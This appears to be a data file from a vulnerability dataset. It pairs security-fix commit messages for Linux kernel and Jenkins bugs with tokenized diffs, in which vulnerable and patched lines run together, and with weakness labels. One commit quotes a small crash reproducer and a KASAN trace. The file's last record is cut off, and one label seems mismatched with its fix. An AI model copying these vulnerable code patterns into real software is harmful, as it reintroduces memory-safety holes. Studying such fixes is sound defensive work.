{"contents": ["econet:", "disallow", "NULL", "remote", "addr", "for", "sendmsg(),", "fixes", "Later", "parts", "of", "econet_sendmsg()", "rely", "on", "saddr", "!=", "NULL,", "so", "return", "early", "with", "EINVAL", "if", "NULL", "was", "passed", "otherwise", "an", "oops", "may", "occur.", "Signed-off-by:", "Phil", "Blundell", "<philb@gnu.org>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["@", "@", "-", "297", ",", "23", "+", "297", ",", "14", "@", "@", "static", "int", "econet_sendmsg", "(", "struct", "kiocb", "*", "iocb", ",", "struct", "socket", "*", "sock", ",", "mutex_lock", "(", "&", "econet_mutex", ")", ";", "if", "(", "saddr", "=", "=", "NULL", ")", "{", "struct", "econet_sock", "*", "eo", "=", "ec_sk", "(", "sk", ")", ";", "addr", ".", "station", "=", "eo", "-", ">", "station", ";", "addr", ".", "net", "=", "eo", "-", ">", "net", ";", "port", "=", "eo", "-", ">", "port", ";", "cb", "=", "eo", "-", ">", "cb", ";", "}", "else", "{", "if", "(", "msg", "-", ">", "msg_namelen", "<", "sizeof", "(", "struct", "sockaddr_ec", ")", ")", "{", "mutex_unlock", "(", "&", "econet_mutex", ")", ";", "return", "-", "EINVAL", ";", "}", "addr", ".", "station", "=", "saddr", "-", ">", "addr", ".", "station", ";", "addr", ".", "net", "=", "saddr", "-", ">", "addr", ".", "net", ";", "port", "=", "saddr", "-", ">", "port", ";", "cb", "=", "saddr", "-", ">", "cb", ";", "}", "if", "(", "saddr", "=", "=", "NULL", "|", "|", "msg", "-", ">", "msg_namelen", "<", "sizeof", "(", "struct", "sockaddr_ec", ")", ")", "{", "mutex_unlock", "(", "&", "econet_mutex", ")", ";", "return", "-", "EINVAL", ";", "}", "addr", ".", "station", "=", "saddr", "-", ">", "addr", ".", "station", ";", "addr", ".", "net", "=", "saddr", "-", ">", "addr", ".", "net", ";", "port", "=", "saddr", "-", ">", "port", ";", "cb", "=", "saddr", "-", ">", "cb", ";", "/", "*", "Look", "for", "a", "device", "with", "the", "right", "network", "number", ".", "*", "/", "dev", "=", "net2dev_map", "[", "addr", ".", "net", "]", ";", "@", "@", "-", "351", ",", "7", "+", "342", ",", "6", "@", "@", "static", "int", "econet_sendmsg", "(", "struct", "kiocb", "*", "iocb", ",", "struct", "socket", "*", "sock", ",", "eb", "=", "(", "struct", "ec_cb", "*", ")&", "skb", "-", ">", "cb", ";", "/", "*", "BUG", ":", "saddr", "may", "be", "NULL", "*", "/", "eb", "-", ">", "cookie", "=", "saddr", "-", ">", "cookie", ";", "eb", "-", ">", "sec", "=", "*", "saddr", ";", "eb", "-", ">", "sent", "=", "ec_tx_done", ";"], "docstring_tokens": ["address", "limit", "override"]}
{"contents": ["ipv6:", "Prevent", "overrun", "when", "parsing", "v6", "header", "options", "The", "KASAN", "warning", "repoted", "below", "was", "discovered", "with", "a", "syzkaller", "program.", "The", "reproducer", "is", "basically:", "int", "s", "=", "socket(AF_INET6,", "SOCK_RAW,", "NEXTHDR_HOP);", "send(s,", "&one_byte_of_data,", "1,", "MSG_MORE);", "send(s,", "&more_than_mtu_bytes_data,", "2000,", "0);", "The", "socket()", "call", "sets", "the", "nexthdr", "field", "of", "the", "v6", "header", "to", "NEXTHDR_HOP,", "the", "first", "send", "call", "primes", "the", "payload", "with", "a", "non", "zero", "byte", "of", "data,", "and", "the", "second", "send", "call", "triggers", "the", "fragmentation", "path.", "The", "fragmentation", "code", "tries", "to", "parse", "the", "header", "options", "in", "order", "to", "figure", "out", "where", "to", "insert", "the", "fragment", "option.", "Since", "nexthdr", "points", "to", "an", "invalid", "option,", "the", "calculation", "of", "the", "size", "of", "the", "network", "header", "can", "made", "to", "be", "much", "larger", "than", "the", "linear", "section", "of", "the", "skb", "and", "data", "is", "read", "outside", "of", "it.", "This", "fix", "makes", "ip6_find_1stfrag", "return", "an", "error", "if", "it", "detects", "running", "out-of-bounds.", "[", "42.361487]", "==================================================================", "[", "42.364412]", "BUG:", "KASAN:", "slab-out-of-bounds", "in", "ip6_fragment+0x11c8/0x3730", "[", "42.365471]", "Read", "of", "size", "840", "at", "addr", "ffff88000969e798", "by", "task", "ip6_fragment-oo/3789", "[", "42.366469]", "[", "42.366696]", "CPU:", "1", "PID:", "3789", "Comm:", "ip6_fragment-oo", "Not", "tainted", "4.11.0+", "#41", "[", "42.367628]", "Hardware", "name:", "QEMU", "Standard", "PC", "(i440FX", "+", "PIIX,", "1996),", "BIOS", "1.10.1-1ubuntu1", "04/01/2014", "[", "42.368824]", "Call", "Trace:", "[", "42.369183]", "dump_stack+0xb3/0x10b", "[", "42.369664]", "print_address_description+0x73/0x290", "[", "42.370325]", "kasan_report+0x252/0x370", "[", "42.370839]", "?", "ip6_fragment+0x11c8/0x3730", "[", "42.371396]", "check_memory_region+0x13c/0x1a0", "[", "42.371978]", "memcpy+0x23/0x50", "[", "42.372395]", "ip6_fragment+0x11c8/0x3730", "[", "42.372920]", "?", "nf_ct_expect_unregister_notifier+0x110/0x110", "[", "42.373681]", "?", "ip6_copy_metadata+0x7f0/0x7f0", "[", "42.374263]", "?", "ip6_forward+0x2e30/0x2e30", "[", "42.374803]", "ip6_finish_output+0x584/0x990", "[", "42.375350]", "ip6_output+0x1b7/0x690", "[", "42.375836]", "?", "ip6_finish_output+0x990/0x990", "[", "42.376411]", "?", "ip6_fragment+0x3730/0x3730", "[", "42.376968]", "ip6_local_out+0x95/0x160", "[", "42.377471]", "ip6_send_skb+0xa1/0x330", "[", "42.377969]", "ip6_push_pending_frames+0xb3/0xe0", "[", "42.378589]", "rawv6_sendmsg+0x2051/0x2db0", "[", "42.379129]", "?", "rawv6_bind+0x8b0/0x8b0", "[", "42.379633]", "?", "_copy_from_user+0x84/0xe0", "[", "42.380193]", "?", "debug_check_no_locks_freed+0x290/0x290", "[", "42.380878]", "?", "___sys_sendmsg+0x162/0x930", "[", "42.381427]", "?", "rcu_read_lock_sched_held+0xa3/0x120", "[", "42.382074]", "?", "sock_has_perm+0x1f6/0x290", "[", "42.382614]", "?", "___sys_sendmsg+0x167/0x930", "[", "42.383173]", "?", "lock_downgrade+0x660/0x660", "[", "42.383727]", "inet_sendmsg+0x123/0x500", "[", "42.384226]", "?", "inet_sendmsg+0x123/0x500", "[", "42.384748]", "?", "inet_recvmsg+0x540/0x540", "[", "42.385263]", "sock_sendmsg+0xca/0x110", "[", "42.385758]", "SYSC_sendto+0x217/0x380", "[", "42.386249]", "?", "SYSC_connect+0x310/0x310", "[", "42.386783]", "?", "__might_fault+0x110/0x1d0", "[", "42.387324]", "?", "lock_downgrade+0x660/0x660", "[", "42.387880]", "?", "__fget_light+0xa1/0x1f0", "[", "42.388403]", "?", "__fdget+0x18/0x20", "[", "42.388851]", "?", "sock_common_setsockopt+0x95/0xd0", "[", "42.389472]", "?", "SyS_setsockopt+0x17f/0x260", "[", "42.390021]", "?", "entry_SYSCALL_64_fastpath+0x5/0xbe", "[", "42.390650]", "SyS_sendto+0x40/0x50", "[", "42.391103]", "entry_SYSCALL_64_fastpath+0x1f/0xbe", "[", "42.391731]", "RIP:", "0033:0x7fbbb711e383", "[", "42.392217]", "RSP:", "002b:00007ffff4d34f28", "EFLAGS:", "00000246", "ORIG_RAX:", "000000000000002c", "[", "42.393235]", "RAX:", "ffffffffffffffda", "RBX:", "0000000000000000", "RCX:", "00007fbbb711e383", "[", "42.394195]", "RDX:", "0000000000001000", "RSI:", "00007ffff4d34f60", "RDI:", "0000000000000003", "[", "42.395145]", "RBP:", "0000000000000046", "R08:", "00007ffff4d34f40", "R09:", "0000000000000018", "[", "42.396056]", "R10:", "0000000000000000", "R11:", "0000000000000246", "R12:", "0000000000400aad", "[", "42.396598]", "R13:", "0000000000000066", "R14:", "00007ffff4d34ee0", "R15:", "00007fbbb717af00", "[", "42.397257]", "[", "42.397411]", "Allocated", "by", "task", "3789:", "[", "42.397702]", "save_stack_trace+0x16/0x20", "[", "42.398005]", "save_stack+0x46/0xd0", "[", "42.398267]", "kasan_kmalloc+0xad/0xe0", "[", "42.398548]", "kasan_slab_alloc+0x12/0x20", "[", "42.398848]", "__kmalloc_node_track_caller+0xcb/0x380", "[", "42.399224]", "__kmalloc_reserve.isra.32+0x41/0xe0", "[", "42.399654]", "__alloc_skb+0xf8/0x580", "[", "42.400003]", "sock_wmalloc+0xab/0xf0", "[", "42.400346]", "__ip6_append_data.isra.41+0x2472/0x33d0", "[", "42.400813]", "ip6_append_data+0x1a8/0x2f0", "[", "42.401122]", "rawv6_sendmsg+0x11ee/0x2db0", "[", "42.401505]", "inet_sendmsg+0x123/0x500", "[", "42.401860]", "sock_sendmsg+0xca/0x110", "[", "42.402209]", "___sys_sendmsg+0x7cb/0x930", "[", "42.402582]", "__sys_sendmsg+0xd9/0x190", "[", "42.402941]", "SyS_sendmsg+0x2d/0x50", "[", "42.403273]", "entry_SYSCALL_64_fastpath+0x1f/0xbe", "[", "42.403718]", "[", "42.403871]", "Freed", "by", "task", "1794:", "[", "42.404146]", "save_stack_trace+0x16/0x20", "[", "42.404515]", "save_stack+0x46/0xd0", "[", "42.404827]", "kasan_slab_free+0x72/0xc0", "[", "42.405167]", "kfree+0xe8/0x2b0", "[", "42.405462]", "skb_free_head+0x74/0xb0", "[", "42.405806]", "skb_release_data+0x30e/0x3a0", "[", "42.406198]", "skb_release_all+0x4a/0x60", "[", "42.406563]", "consume_skb+0x113/0x2e0", "[", "42.406910]", "skb_free_datagram+0x1a/0xe0", "[", "42.407288]", "netlink_recvmsg+0x60d/0xe40", "[", "42.407667]", "sock_recvmsg+0xd7/0x110", "[", "42.408022]", "___sys_recvmsg+0x25c/0x580", "[", "42.408395]", "__sys_recvmsg+0xd6/0x190", "[", "42.408753]", "SyS_recvmsg+0x2d/0x50", "[", "42.409086]", "entry_SYSCALL_64_fastpath+0x1f/0xbe", "[", "42.409513]", "[", "42.409665]", "The", "buggy", "address", "belongs", "to", "the", "object", "at", "ffff88000969e780", "[", "42.409665]", "which", "belongs", "to", "the", "cache", "kmalloc-512", "of", "size", "512", "[", "42.410846]", "The", "buggy", "address", "is", "located", "24", "bytes", "inside", "of", "[", "42.410846]", "512-byte", "region", "[ffff88000969e780,", "ffff88000969e980)", "[", "42.411941]", "The", "buggy", "address", "belongs", "to", "the", "page:", "[", "42.412405]", "page:ffffea000025a780", "count:1", "mapcount:0", "mapping:", "(null)", "index:0x0", "compound_mapcount:", "0", "[", "42.413298]", "flags:", "0x100000000008100(slab|head)", "[", "42.413729]", "raw:", "0100000000008100", "0000000000000000", "0000000000000000", "00000001800c000c", "[", "42.414387]", "raw:", "ffffea00002a9500", "0000000900000007", "ffff88000c401280", "0000000000000000", "[", "42.415074]", "page", "dumped", "because:", "kasan:", "bad", "access", "detected", "[", "42.415604]", "[", "42.415757]", "Memory", "state", "around", "the", "buggy", "address:", "[", "42.416222]", "ffff88000969e880:", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "[", "42.416904]", "ffff88000969e900:", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "[", "42.417591]", ">ffff88000969e980:", "fc", "fc", "fc", "fc", "fc", "fc", "fc", "fc", "fc", "fc", "fc", "fc", "fc", "fc", "fc", "fc", "[", "42.418273]", "^", "[", "42.418588]", "ffff88000969ea00:", "fb", "fb", "fb", "fb", "fb", "fb", "fb", "fb", "fb", "fb", "fb", "fb", "fb", "fb", "fb", "fb", "[", "42.419273]", "ffff88000969ea80:", "fb", "fb", "fb", "fb", "fb", "fb", "fb", "fb", "fb", "fb", "fb", "fb", "fb", "fb", "fb", "fb", "[", "42.419882]", "==================================================================", "Reported-by:", "Andrey", "Konovalov", "<andreyknvl@google.com>", "Signed-off-by:", "Craig", "Gallek", "<kraig@google.com>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["@", "@", "-", "117", ",", "6", "+", "117", ",", "8", "@", "@", "static", "struct", "sk_buff", "*", "ipv6_gso_segment", "(", "struct", "sk_buff", "*", "skb", ",", "if", "(", "udpfrag", ")", "{", "unfrag_ip6hlen", "=", "ip6_find_1stfragopt", "(", "skb", ",", "&", "prevhdr", ")", ";", "if", "(", "unfrag_ip6hlen", "<", "0", ")", "return", "ERR_PTR", "(", "unfrag_ip6hlen", ")", ";", "fptr", "=", "(", "struct", "frag_hdr", "*", ")(", "(", "u8", "*", ")", "ipv6h", "+", "unfrag_ip6hlen", ")", ";", "fptr", "-", ">", "frag_off", "=", "htons", "(", "offset", ")", ";", "if", "(", "skb", "-", ">", "next", ")", "@", "@", "-", "598", ",", "6", "+", "598", ",", "10", "@", "@", "int", "ip6_fragment", "(", "struct", "net", "*", "net", ",", "struct", "sock", "*", "sk", ",", "struct", "sk_buff", "*", "skb", ",", "u8", "*", "prevhdr", ",", "nexthdr", "=", "0", ";", "hlen", "=", "ip6_find_1stfragopt", "(", "skb", ",", "&", "prevhdr", ")", ";", "if", "(", "hlen", "<", "0", ")", "{", "err", "=", "hlen", ";", "goto", "fail", ";", "}", "nexthdr", "=", "*", "prevhdr", ";", "mtu", "=", "ip6_skb_dst_mtu", "(", "skb", ")", ";", "@", "@", "-", "79", ",", "14", "+", "79", ",", "13", "@", "@", "EXPORT_SYMBOL", "(", "ipv6_select_ident", ")", ";", "int", "ip6_find_1stfragopt", "(", "struct", "sk_buff", "*", "skb", ",", "u8", "*", "*", "nexthdr", ")", "{", "u16", "offset", "=", "sizeof", "(", "struct", "ipv6hdr", ")", ";", "struct", "ipv6_opt_hdr", "*", "exthdr", "=", "(", "struct", "ipv6_opt_hdr", "*", ")(", "ipv6_hdr", "(", "skb", ")", "+", "1", ")", ";", "unsigned", "int", "packet_len", "=", "skb_tail_pointer", "(", "skb", ")", "-", "skb_network_header", "(", "skb", ")", ";", "int", "found_rhdr", "=", "0", ";", "*", "nexthdr", "=", "&", "ipv6_hdr", "(", "skb", ")", "->", "nexthdr", ";", "while", "(", "offset", "+", "1", "<", "=", "packet_len", ")", "{", "while", "(", "offset", "<", "=", "packet_len", ")", "{", "struct", "ipv6_opt_hdr", "*", "exthdr", ";", "switch", "(", "**", "nexthdr", ")", "{", "@", "@", "-", "107", ",", "13", "+", "106", ",", "16", "@", "@", "int", "ip6_find_1stfragopt", "(", "struct", "sk_buff", "*", "skb", ",", "u8", "*", "*", "nexthdr", ")", "return", "offset", ";", "}", "offset", "+", "=", "ipv6_optlen", "(", "exthdr", ")", ";", "*", "nexthdr", "=", "&", "exthdr", "-", ">", "nexthdr", ";", "if", "(", "offset", "+", "sizeof", "(", "struct", "ipv6_opt_hdr", ")", ">", "packet_len", ")", "return", "-", "EINVAL", ";", "exthdr", "=", "(", "struct", "ipv6_opt_hdr", "*", ")(", "skb_network_header", "(", "skb", ")", "+", "offset", ")", ";", "offset", "+", "=", "ipv6_optlen", "(", "exthdr", ")", ";", "*", "nexthdr", "=", "&", "exthdr", "-", ">", "nexthdr", ";", "}", "return", "offset", ";", "return", "-", "EINVAL", ";", "}", "EXPORT_SYMBOL", "(", "ip6_find_1stfragopt", ")", ";", "@", "@", "-", "91", ",", "6", "+", "91", ",", "8", "@", "@", "static", "struct", "sk_buff", "*", "udp6_ufo_fragment", "(", "struct", "sk_buff", "*", "skb", ",", "*", "bytes", "to", "insert", "fragment", "header", ".", "*", "/", "unfrag_ip6hlen", "=", "ip6_find_1stfragopt", "(", "skb", ",", "&", "prevhdr", ")", ";", "if", "(", "unfrag_ip6hlen", "<", "0", ")", "return", "ERR_PTR", "(", "unfrag_ip6hlen", ")", ";", "nexthdr", "=", "*", "prevhdr", ";", "*", "prevhdr", "=", "NEXTHDR_FRAGMENT", ";", "unfrag_len", "=", "(", "skb_network_header", "(", "skb", ")", "-", "skb_mac_header", "(", "skb", ")", ")", "+"], "docstring_tokens": ["out-of-bounds", "read"]}
{"contents": ["ALSA:", "usb-audio:", "Fix", "NULL", "dereference", "in", "create_fixed_stream_quirk()", "create_fixed_stream_quirk()", "may", "cause", "a", "NULL-pointer", "dereference", "by", "accessing", "the", "non-existing", "endpoint", "when", "a", "USB", "device", "with", "a", "malformed", "USB", "descriptor", "is", "used.", "This", "patch", "avoids", "it", "simply", "by", "adding", "a", "sanity", "check", "of", "bNumEndpoints", "before", "the", "accesses.", "Bugzilla:", "https://bugzilla.suse.com/show_bug.cgi?id=971125", "Cc:", "<stable@vger.kernel.org>", "Signed-off-by:", "Takashi", "Iwai", "<tiwai@suse.de>"], "code_tokens": ["@", "@", "-", "180", ",", "6", "+", "180", ",", "12", "@", "@", "static", "int", "create_fixed_stream_quirk", "(", "struct", "snd_usb_audio", "*", "chip", ",", "}", "alts", "=", "&", "iface", "-", ">", "altsetting", "[", "fp", "-", ">", "altset_idx", "]", ";", "altsd", "=", "get_iface_desc", "(", "alts", ")", ";", "if", "(", "altsd", "-", ">", "bNumEndpoints", "<", "1", ")", "{", "kfree", "(", "fp", ")", ";", "kfree", "(", "rate_table", ")", ";", "return", "-", "EINVAL", ";", "}", "fp", "-", ">", "protocol", "=", "altsd", "-", ">", "bInterfaceProtocol", ";", "if", "(", "fp", "-", ">", "datainterval", "=", "=", "0", ")"], "docstring_tokens": ["pointer", "dereference"]}
{"contents": ["HID:", "magicmouse:", "sanity", "check", "report", "size", "in", "raw_event()", "callback", "The", "report", "passed", "to", "us", "from", "transport", "driver", "could", "potentially", "be", "arbitrarily", "large,", "therefore", "we", "better", "sanity-check", "it", "so", "that", "magicmouse_emit_touch()", "gets", "only", "valid", "values", "of", "raw_id.", "Cc:", "stable@vger.kernel.org", "Reported-by:", "Steven", "Vittitoe", "<scvitti@google.com>", "Signed-off-by:", "Jiri", "Kosina", "<jkosina@suse.cz>"], "code_tokens": ["@", "@", "-", "290", ",", "6", "+", "290", ",", "11", "@", "@", "static", "int", "magicmouse_raw_event", "(", "struct", "hid_device", "*", "hdev", ",", "if", "(", "size", "<", "4", "|", "|", "(", "(", "size", "-", "4", ")", "%", "9", ")", "!", "=", "0", ")", "return", "0", ";", "npoints", "=", "(", "size", "-", "4", ")", "/", "9", ";", "if", "(", "npoints", ">", "15", ")", "{", "hid_warn", "(", "hdev", ",", "\"", "invalid", "size", "value", "(", "%", "d", ")", "for", "TRACKPAD_REPORT_ID", "\\", "n", "\"", ",", "size", ")", ";", "return", "0", ";", "}", "msc", "-", ">", "ntouches", "=", "0", ";", "for", "(", "ii", "=", "0", ";", "ii", "<", "npoints", ";", "ii", "+", "+)", "magicmouse_emit_touch", "(", "msc", ",", "ii", ",", "data", "+", "ii", "*", "9", "+", "4", ")", ";", "@", "@", "-", "307", ",", "6", "+", "312", ",", "11", "@", "@", "static", "int", "magicmouse_raw_event", "(", "struct", "hid_device", "*", "hdev", ",", "if", "(", "size", "<", "6", "|", "|", "(", "(", "size", "-", "6", ")", "%", "8", ")", "!", "=", "0", ")", "return", "0", ";", "npoints", "=", "(", "size", "-", "6", ")", "/", "8", ";", "if", "(", "npoints", ">", "15", ")", "{", "hid_warn", "(", "hdev", ",", "\"", "invalid", "size", "value", "(", "%", "d", ")", "for", "MOUSE_REPORT_ID", "\\", "n", "\"", ",", "size", ")", ";", "return", "0", ";", "}", "msc", "-", ">", "ntouches", "=", "0", ";", "for", "(", "ii", "=", "0", ";", "ii", "<", "npoints", ";", "ii", "+", "+)", "magicmouse_emit_touch", "(", "msc", ",", "ii", ",", "data", "+", "ii", "*", "8", "+", "6", ")", ";"], "docstring_tokens": ["buffer", "overflows"]}
{"contents": ["[SECURITY-786]"], "code_tokens": ["@", "@", "-", "64", ",", "6", "+", "64", ",", "7", "@", "@", "import", "org", ".", "mindrot", ".", "jbcrypt", ".", "BCrypt", ";", "import", "org", ".", "springframework", ".", "dao", ".", "DataAccessException", ";", "import", "javax", ".", "annotation", ".", "Nonnull", ";", "import", "javax", ".", "servlet", ".", "Filter", ";", "import", "javax", ".", "servlet", ".", "FilterChain", ";", "import", "javax", ".", "servlet", ".", "FilterConfig", ";", "@", "@", "-", "95", ",", "6", "+", "96", ",", "15", "@", "@", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "/", "public", "class", "HudsonPrivateSecurityRealm", "extends", "AbstractPasswordBasedSecurityRealm", "implements", "ModelObject", ",", "AccessControlled", "{", "private", "static", "/", "*", "not", "final", "*", "/", "String", "ID_REGEX", "=", "System", ".", "getProperty", "(", "HudsonPrivateSecurityRealm", ".", "class", ".", "getName", "(", ")", "+", "\"", ".", "ID_REGEX", "\"", ");", "/", "**", "*", "Default", "REGEX", "for", "the", "user", "ID", "check", "in", "case", "the", "ID_REGEX", "is", "not", "set", "*", "It", "allows", "A", "-", "Za", "-", "z0", "-", "9", "+", "\"", "_", "-", "\"", "*", "in", "Java", "{", "@", "code", "\\", "w", "}", "is", "equivalent", "to", "{", "@", "code", "[", "A", "-", "Za", "-", "z0", "-", "9_", "]", "}", "(", "take", "care", "of", "\"", "_", "\"", ")", "*", "/", "private", "static", "final", "String", "DEFAULT_ID_REGEX", "=", "\"", "^[", "\\\\", "w", "-", "]+", "$\"", ";", "/", "**", "*", "If", "true", ",", "sign", "up", "is", "not", "allowed", ".", "*", "<", "p", ">", "@", "@", "-", "338", ",", "6", "+", "348", ",", "12", "@", "@", "private", "User", "createAccount", "(", "StaplerRequest", "req", ",", "StaplerResponse", "rsp", ",", "boolean", "self", "if", "(", "si", ".", "username", "=", "=", "null", "|", "|", "si", ".", "username", ".", "length", "(", ")=", "=", "0", ")", "si", ".", "errorMessage", "=", "Messages", ".", "HudsonPrivateSecurityRealm_CreateAccount_UserNameRequired", "(", ");", "else", "if", "(", "!", "containsOnlyAcceptableCharacters", "(", "si", ".", "username", ")", ")", "if", "(", "ID_REGEX", "=", "=", "null", ")", "{", "si", ".", "errorMessage", "=", "Messages", ".", "HudsonPrivateSecurityRealm_CreateAccount_UserNameInvalidCharacters", "(", ");", "}", "else", "{", "si", ".", "errorMessage", "=", "Messages", ".", "HudsonPrivateSecurityRealm_CreateAccount_UserNameInvalidCharactersCustom", "(", "ID_REGEX", ")", ";", "}", "else", "{", "/", "/", "do", "not", "create", "the", "user", "-", "we", "just", "want", "to", "check", "if", "the", "user", "already", "exists", "but", "is", "not", "a", "\"", "login", "\"", "user", ".", "User", "user", "=", "User", ".", "getById", "(", "si", ".", "username", ",", "false", ")", ";", "@", "@", "-", "385", ",", "6", "+", "401", ",", "14", "@", "@", "private", "User", "createAccount", "(", "StaplerRequest", "req", ",", "StaplerResponse", "rsp", ",", "boolean", "self", "return", "user", ";", "}", "private", "boolean", "containsOnlyAcceptableCharacters", "(", "@", "Nonnull", "String", "value", ")", "{", "if", "(", "ID_REGEX", "=", "=", "null", ")", "{", "return", "value", ".", "matches", "(", "DEFAULT_ID_REGEX", ")", ";", "}", "else", "{", "return", "value", ".", "matches", "(", "ID_REGEX", ")", ";", "}", "}", "@", "Restricted", "(", "NoExternalUse", ".", "class", ")", "public", "boolean", "isMailerPluginPresent", "(", ")", "{", "try", "{", "@", "@", "-", "37", ",", "6", "+", "37", ",", "8", "@", "@", "HudsonPrivateSecurityRealm", ".", "CreateAccount", ".", "TextNotMatchWordInImage", "=", "Text", "didn", "'", "t", "mat", "HudsonPrivateSecurityRealm", ".", "CreateAccount", ".", "PasswordNotMatch", "=", "Password", "didn", "'", "t", "match", "HudsonPrivateSecurityRealm", ".", "CreateAccount", ".", "PasswordRequired", "=", "Password", "is", "required", "HudsonPrivateSecurityRealm", ".", "CreateAccount", ".", "UserNameRequired", "=", "User", "name", "is", "required", "HudsonPrivateSecurityRealm", ".", "CreateAccount", ".", "UserNameInvalidCharacters", "=", "User", "name", "must", "only", "contain", "alphanumeric", "characters", ",", "underscore", "and", "dash", "HudsonPrivateSecurityRealm", ".", "CreateAccount", ".", "UserNameInvalidCharactersCustom", "=", "User", "name", "must", "match", "the", "following", "expression", ":", "{", "0", "}", "HudsonPrivateSecurityRealm", ".", "CreateAccount", ".", "InvalidEmailAddress", "=", "Invalid", "e", "-", "mail", "address", "HudsonPrivateSecurityRealm", ".", "CreateAccount", ".", "UserNameAlreadyTaken", "=", "User", "name", "is", "already", "taken", "@", "@", "-", "2", ",", "15", "+", "2", ",", "21", "@", "@", "import", "static", "hudson", ".", "security", ".", "HudsonPrivateSecurityRealm", ".", "CLASSIC", ";", "import", "static", "hudson", ".", "security", ".", "HudsonPrivateSecurityRealm", ".", "PASSWORD_ENCODER", ";", "import", "static", "org", ".", "hamcrest", ".", "Matchers", ".", "containsString", ";", "import", "static", "org", ".", "hamcrest", ".", "Matchers", ".", "not", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertEquals", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertFalse", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertNotNull", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertTrue", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertThat", ";", "import", "static", "org", ".", "hamcrest", ".", "Matchers", ".", "is", ";", "import", "static", "org", ".", "hamcrest", ".", "xml", ".", "HasXPath", ".", "hasXPath", ";", "import", "java", ".", "io", ".", "UnsupportedEncodingException", ";", "import", "java", ".", "lang", ".", "reflect", ".", "Field", ";", "import", "hudson", ".", "security", ".", "pages", ".", "SignupPage", ";", "import", "org", ".", "junit", ".", "Before", ";", "import", "org", ".", "junit", ".", "Rule", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "Issue", ";", "@", "@", "-", "34", ",", "6", "+", "40", ",", "13", "@", "@", "@", "Rule", "public", "JenkinsRule", "j", "=", "new", "JenkinsRule", "(", ");", "@", "Before", "public", "void", "setup", "(", ")", "throws", "Exception", "{", "Field", "field", "=", "HudsonPrivateSecurityRealm", ".", "class", ".", "getDeclaredField", "(", "\"", "ID_REGEX", "\"", ");", "field", ".", "setAccessible", "(", "true", ")", ";", "field", ".", "set", "(", "null", ",", "null", ")", ";", "}", "/", "**", "*", "Tests", "the", "data", "compatibility", "with", "Hudson", "before", "1", ".", "283", ".", "*", "Starting", "1", ".", "283", ",", "passwords", "are", "now", "stored", "hashed", ".", "@", "@", "-", "170", ",", "5", "+", "183", ",", "119", "@", "@", "private", "static", "final", "String", "basicHeader", "(", "String", "user", ",", "String", "pass", ")", "throws", "Unsuppo", "String", "authHeader", "=", "\"", "Basic", "\"", "+", "auth", ";", "return", "authHeader", ";", "}", "@", "Issue", "(", "\"", "SECURITY", "-", "786", "\"", ")", "@", "Test", "public", "void", "controlCharacterAreNoMoreValid", "(", ")", "throws", "Exception", "{", "HudsonPrivateSecurityRealm", "securityRealm", "=", "new", "HudsonPrivateSecurityRealm", "(", "true", ",", "false", ",", "null", ")", ";", "j", ".", "jenkins", ".", "setSecurityRealm", "(", "securityRealm", ")", ";", "String", "password", "=", "\"", "testPwd", "\"", ";", "String", "email", "=", "\"", "test", "@", "test", ".", "com", "\"", ";", "int", "i", "=", "0", ";", "/", "/", "regular", "case", "=", "only", "accepting", "a", "-", "zA", "-", "Z0", "-", "9", "+", "\"", "-", "_", "\"", "checkUserCanBeCreatedWith", "(", "securityRealm", ",", "\"", "test", "\"", "+", "i", ",", "password", ",", "\"", "Test", "\"", "+", "i", ",", "email", ")", ";", "assertNotNull", "(", "User", ".", "getById", "(", "\"", "test", "\"", "+", "i", ",", "false", ")", ");", "i", "+", "+;", "checkUserCanBeCreatedWith", "(", "securityRealm", ",", "\"", "te", "-", "st_123", "\"", "+", "i", ",", "password", ",", "\"", "Test", "\"", "+", "i", ",", "email", ")", ";", "assertNotNull", "(", "User", ".", "getById", "(", "\"", "te", "-", "st_123", "\"", "+", "i", ",", "false", ")", ");", "i", "+", "+;", "{", "//", "user", "id", "that", "contains", "invalid", "characters", "checkUserCannotBeCreatedWith", "(", "securityRealm", ",", "\"", "test", "\"", "+", "i", ",", "password", ",", "\"", "Test", "\"", "+", "i", ",", "email", ")", ";", "i", "+", "+;", "checkUserCannotBeCreatedWith", "(", "securityRealm", ",", "\"", "te", "@", "st", "\"", "+", "i", ",", "password", ",", "\"", "Test", "\"", "+", "i", ",", "email", ")", ";", "i", "+", "+;", "checkUserCannotBeCreatedWith", "(", "securityRealm", ",", "\"", "test", ".", "com", "\"", "+", "i", ",", "password", ",", "\"", "Test", "\"", "+", "i", ",", "email", ")", ";", "i", "+", "+;", "checkUserCannotBeCreatedWith", "(", "securityRealm", ",", "\"", "test", ",", "com", "\"", "+", "i", ",", "password", ",", "\"", "Test", "\"", "+", "i", ",", "email", ")", ";", "i", "+", "+;", "checkUserCannotBeCreatedWith", "(", "securityRealm", ",", "\"", "test", ",", "com", "\"", "+", "i", ",", "password", ",", "\"", "Test", "\"", "+", "i", ",", "email", ")", ";", "i", "+", "+;", "checkUserCannotBeCreatedWith", "(", "securityRealm", ",", "\"", "test", "\u00e9", "com", "\"", "+", "i", ",", "password", ",", "\"", "Test", "\"", "+", "i", ",", "email", ")", ";", "i", "+", "+;", "checkUserCannotBeCreatedWith", "(", "securityRealm", ",", "\"", "Starg", "\u00e5", "te", "\"", "+", "i", ",", "password", ",", "\"", "Test", "\"", "+", "i", ",", "email", ")", ";", "i", "+", "+;", "checkUserCannotBeCreatedWith", "(", "securityRealm", ",", "\"", "te", "\\", "u0000st", "\"", "+", "i", ",", "password", ",", "\"", "Test", "\"", "+", "i", ",", "email", ")", ";", "i", "+", "+;", "}", "}", "@", "Issue", "(", "\"", "SECURITY", "-", "786", "\"", ")", "@", "Test", "public", "void", "controlCharacterAreNoMoreValid_CustomRegex", "(", ")", "throws", "Exception", "{", "HudsonPrivateSecurityRealm", "securityRealm", "=", "new", "HudsonPrivateSecurityRealm", "(", 